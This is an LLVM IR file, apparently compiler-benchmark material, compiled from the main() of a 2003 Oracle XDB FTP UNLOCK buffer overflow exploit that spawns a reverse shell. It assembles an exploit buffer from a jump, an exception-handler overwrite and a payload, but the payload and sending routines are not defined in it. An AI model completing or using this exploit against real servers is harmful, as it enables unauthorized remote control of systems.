; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_80.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_80.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [57 x i8] c"\0A\0A\09Oracle XDB FTP Service UNLOCK Buffer Overflow Exploit\00", align 1
@.str.1 = private unnamed_addr constant [42 x i8] c"\0A\09\09for Blackhat (http://www.blackhat.com)\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"\0A\0A\09Spawns a reverse shell to specified port\00", align 1
@.str.3 = private unnamed_addr constant [49 x i8] c"\0A\0A\09Usage:\09%s host userid password ipaddress port\00", align 1
@.str.4 = private unnamed_addr constant [45 x i8] c"\0A\0A\09David Litchfield\0A\09(david@ngssoftware.com)\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"\0A\096th July 2003\0A\0A\0A\00", align 1
@host = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [25 x i8] c"Error starting Winsock.\0A\00", align 1
@exploit_code = common dso_local global i32 0, align 4
@short_jump = common dso_local global i8* null, align 8
@exception_handler = common dso_local global i8* null, align 8
@exploit = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %6 = load i32, i32* %4, align 4
  %7 = icmp ne i32 %6, 6
  br i1 %7, label %8, label %18

8:                                                ; preds = %2
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str, i64 0, i64 0))
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i64 0, i64 0))
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0))
  %12 = load i8**, i8*** %5, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 0
  %14 = load i8*, i8** %13, align 8
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.3, i64 0, i64 0), i8* %14)
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.4, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %55

18:                                               ; preds = %2
  %19 = load i32, i32* @host, align 4
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @strncpy(i32 %19, i8* %22, i32 250)
  %24 = call i64 (...) @StartWinsock()
  %25 = icmp eq i64 %24, 0
  br i1 %25, label %26, label %28

26:                                               ; preds = %18
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0))
  store i32 %27, i32* %3, align 4
  br label %55

28:                                               ; preds = %18
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 4
  %31 = load i8*, i8** %30, align 8
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 5
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @atoi(i8* %34)
  %36 = call i32 @SetUpExploit(i8* %31, i32 %35)
  %37 = load i32, i32* @exploit_code, align 4
  %38 = load i8*, i8** @short_jump, align 8
  %39 = call i32 @strcat(i32 %37, i8* %38)
  %40 = load i32, i32* @exploit_code, align 4
  %41 = load i8*, i8** @exception_handler, align 8
  %42 = call i32 @strcat(i32 %40, i8* %41)
  %43 = load i32, i32* @exploit_code, align 4
  %44 = load i8*, i8** @exploit, align 8
  %45 = call i32 @strcat(i32 %43, i8* %44)
  %46 = load i32, i32* @exploit_code, align 4
  %47 = call i32 @strcat(i32 %46, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 2
  %50 = load i8*, i8** %49, align 8
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 3
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @GainControlOfOracle(i8* %50, i8* %53)
  store i32 0, i32* %3, align 4
  br label %55

55:                                               ; preds = %28, %26, %8
  %56 = load i32, i32* %3, align 4
  ret i32 %56
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strncpy(i32, i8*, i32) #1

declare dso_local i64 @StartWinsock(...) #1

declare dso_local i32 @SetUpExploit(i8*, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @strcat(i32, i8*) #1

declare dso_local i32 @GainControlOfOracle(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
